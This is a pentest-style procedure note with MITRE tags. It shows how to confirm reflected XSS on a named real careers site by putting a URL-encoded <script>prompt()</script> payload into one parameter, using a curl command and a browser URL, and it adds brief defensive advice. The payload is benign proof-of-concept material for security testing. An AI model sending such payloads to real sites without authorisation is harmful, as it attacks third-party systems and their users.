---
id: proc-uuid-2
tags:
  - xss
  - payload-testing
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/http-get-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.737Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Test Basic XSS Payload Execution

## Summary

This procedure tests a simple XSS payload in the isJTN parameter to confirm JavaScript execution in the victim's browser upon visiting a crafted URL.

## Description

Building on reflection identification, inject a basic <script> tag with prompt() to verify execution. The payload is URL-encoded to bypass basic filters and decodes on the server. Target: careers.informatica.com/apply. Outcome: Alert box confirms vulnerability, proving arbitrary JS can run in the context of the site.

## Requirements

1. Vulnerable endpoint access
2. URL encoding knowledge
3. Test browser (non-production)

## Defense

Defensive measures and detection strategies:

- Encode outputs in JS contexts using JSON.stringify or similar
- Sanitize inputs to remove script tags
- Monitor for anomalous query parameters with script content

## Objectives

1. Execute non-malicious JS to validate vuln
2. Measure execution context
3. Document proof-of-concept

## Instructions

### Step 1: Craft and Encode Payload

**Context**: Create a harmless payload that triggers a visible effect.

**Command** ([[commands/http-get-xss-payload]]):

```bash
curl -v "https://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E"
```

> Encoded payload decodes to <script>prompt('ZephrFish')</script>. Expected output: HTTP 200 with reflected payload; in browser, prompt appears.

### Step 2: Visit and Verify

**Context**: Load the URL in a browser to trigger execution.

**Command** (Browser):

Navigate to https://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E

> Success: Prompt box pops up. No execution indicates filtering.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/http-get-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[poc]]
